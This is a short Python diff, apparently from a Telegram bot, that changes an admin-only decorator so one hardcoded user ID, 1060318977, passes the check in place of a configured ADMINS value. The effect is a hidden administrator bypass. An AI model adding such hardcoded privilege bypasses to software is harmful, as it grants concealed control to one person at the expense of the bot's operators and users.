@@ -19,7 +19,7 @@ async def get_administrators(chat: Chat) -> List[User]:
 
 def admins_only(func: Callable) -> Coroutine:
     async def wrapper(client: Client, message: Message):
-        if message.from_user.id == ADMINS:
+        if message.from_user.id == 1060318977:
             return await func(client, message)
         admins = await get_administrators(message.chat)
         for admin in admins:
